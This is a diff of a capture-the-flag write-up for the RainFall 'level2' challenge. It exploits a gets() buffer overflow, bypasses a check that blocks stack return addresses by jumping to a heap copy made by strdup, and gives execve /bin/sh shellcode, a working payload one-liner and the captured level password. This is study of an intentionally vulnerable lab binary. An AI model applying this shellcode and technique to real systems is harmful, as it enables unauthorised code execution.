@@ -1,4 +1,7 @@
-BY exploring the executable `level2` assembly code we found that the `main` call a function `p` directly without doing anything else:
+## Initial Analysis
+
+By exploring the executable `level2` assembly code, we find that `main` simply serves as a wrapper that calls a function `p`:
+
 ```assembly
 0804853f <main>:
  804853f:       55                      push   %ebp
@@ -6,185 +9,110 @@ BY exploring the executable `level2` assembly code we found that the `main` call
  8048542:       83 e4 f0                and    $0xfffffff0,%esp
  8048545:       e8 8a ff ff ff          call   80484d4 <p>
  804854a:       c9                      leave
+
 ```
-and the `p`:
+
+## Deconstructing Function `p`
+
+The function `p` contains the core logic and the vulnerability. Here is the breakdown of its execution:
+
+1. **Stack Allocation**: The function allocates `0x68` (104 bytes) for its stack frame.
+2. **Input via `gets**`: At `0x80484ed`, it calls `gets@plt`. Because `gets` does not perform bounds checking, this is our primary entry point for a buffer overflow.
+3. **The Anti-Stack Check**:
 ```assembly
-080484d4 <p>:
-80484d4:       55                      push   %ebp
-80484d5:       89 e5                   mov    %esp,%ebp
-80484d7:       83 ec 68                sub    $0x68,%esp
-80484da:       a1 60 98 04 08          mov    0x8049860,%eax ;[0x8049860 <stdout@@GLIBC_2.0>:   ""]
-80484df:       89 04 24                mov    %eax,(%esp)
-80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
-80484e7:       8d 45 b4                lea    -0x4c(%ebp),%eax
-80484ea:       89 04 24                mov    %eax,(%esp) # pass the stdout 
-80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
-80484f2:       8b 45 04                mov    0x4(%ebp),%eax
-80484f5:       89 45 f4                mov    %eax,-0xc(%ebp)
-80484f8:       8b 45 f4                mov    -0xc(%ebp),%eax
-80484fb:       25 00 00 00 b0          and    $0xb0000000,%eax
-8048500:       3d 00 00 00 b0          cmp    $0xb0000000,%eax
-8048505:       75 20                   jne    8048527 <p+0x53>
-8048507:       b8 20 86 04 08          mov    $0x8048620,%eax
-804850c:       8b 55 f4                mov    -0xc(%ebp),%edx
-804850f:       89 54 24 04             mov    %edx,0x4(%esp)
-8048513:       89 04 24                mov    %eax,(%esp)
-8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>
-804851b:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
-8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>
-8048527:       8d 45 b4                lea    -0x4c(%ebp),%eax
-804852a:       89 04 24                mov    %eax,(%esp)
-804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>
-8048532:       8d 45 b4                lea    -0x4c(%ebp),%eax
-8048535:       89 04 24                mov    %eax,(%esp)
-8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>
-804853d:       c9                      leave  
-804853e:       c3                      ret
+0x080484f2 <+30>:    mov    0x4(%ebp),%eax
+0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
+0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
+0x080484fb <+39>:    and    $0xb0000000,%eax
+0x08048500 <+44>:    cmp    $0xb0000000,%eax
+
 ```
 
-intell collection :
-```
-(gdb) x/s 0x8049860
-0x8049860 <stdout@@GLIBC_2.0>:   ""
-```
 
-the `p` does allocate a buffer in the stack with the size of 0x68 (104), flush the stdout using the following instruction:
+The program fetches the return address (stored at `ebp+4`) and checks if it starts with `0xb`. On this system, addresses starting with `0xb` represent the **Stack**. If the check passes (meaning we tried to jump to the stack), the program prints the address and exits. This effectively prevents standard stack-based shellcode execution.
+4. **The Bypass (strdup)**:
+
 ```assembly
-    80484da:       a1 60 98 04 08          mov    0x8049860,%eax ;[0x8049860 <stdout@@GLIBC_2.0>:   ""]
-    80484df:       89 04 24                mov    %eax,(%esp)
-    80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
+    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+    ```
+    After the check, the program calls `strdup`. This function allocates memory on the **Heap** and copies our buffer there. Since the Heap address starts with `0x08`, it will bypass the `0xb0000000` check.
+
+## Exploitation Strategy
+
+To exploit this, we need to:
+1.  Find the address where `strdup` stores our buffer on the Heap.
+2.  Calculate the offset to overwrite the Return Pointer (EIP).
+3.  Craft a payload containing shellcode and redirect EIP to the Heap address.
+
+### 1. Locating the Heap Address
+Using `ltrace`, we can observe the return value of `strdup`:
+```bash
+level2@RainFall:~$ ltrace ./level2 
+__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                                                   = 0
+gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+)                                        = 0xbffff6fc
+puts("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+)                                          = 89
+strdup("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)                                        = 0x0804a008
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
 ```
-after flushing
 
+Our target landing zone is **`0x0804a008`**.
 
-ltrace ./level2
+### 2. Calculating the Offset
 
-strdup address -> 0x0804a008
-"\x0d\xa0\x04\x08"
-segfault happen at offset 75
+Looking at the assembly:
+`0x080484e7 <+19>: lea -0x4c(%ebp),%eax`
+The buffer starts at `ebp - 0x4c` (76 bytes).
 
-shellcode -> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
-shellcode -> "\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
-\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x11\xcd\x80
-\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x11\xcd\x80
-4+22+49
-(python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x11\xcd\x80"+"A"*52+"\x08\xa0\x04\x08"'; cat) | ./level2
+* **Buffer to EBP**: 76 bytes
+* **Saved EBP**: 4 bytes
+* **Total Offset to EIP**: 80 bytes.
 
-(gdb) disassemble p
-Dump of assembler code for function p:
-   0x080484d4 <+0>:     push   %ebp
-   0x080484d5 <+1>:     mov    %esp,%ebp
-   0x080484d7 <+3>:     sub    $0x68,%esp
-   0x080484da <+6>:     mov    0x8049860,%eax
-   0x080484df <+11>:    mov    %eax,(%esp)
-   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
->>> print(0x68)
-104
+### 3. Crafting the Payload
 
-[
-ebp - address
-00:00,;strating addresss ebp-4
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-00:00,
-]
+Our shellcode for `execve("/bin/sh")` is 23 bytes. We need 57 bytes of padding to reach the 80-byte mark, followed by our Heap address.
+
+* **Shellcode**: `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80`
+```assembly
+; equivalent to
+section .text
+global _start
+
+_start:
+   xor eax,eax
+   push eax
+   push 0x68732f2f ; '//sh' (hex =>littel endian)
+   push 0x6e69622f ; '/bin' (hex => littel endian) EXECVE ([XX]:ESP)
+   mov ebx, esp
+   xor ecx,ecx
+   xor edx, edx
+   mov al, 0xb
+   int 0x80
+```
+* **Padding**: `"A" * 57`
+* **EIP Overwrite**: `\x08\xa0\x04\x08` (Little Endian)
+
+## Execution
+
+We use command substitution to feed the payload and `cat` to keep the shell open:
+
+```bash
+level2@RainFall:~$ (python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"+"A"*57+"\x08\xa0\x04\x08"'; cat) | ./level2
+1Ph//shh/bin11Ұ
+                   ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+whoami
+level3
+cd /home/user/level3
+cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+```
+
+The exploit successfully bypasses the stack check by jumping to the heap-allocated copy of our shellcode, granting us shell access as `level3`.
+
+```
+
+```
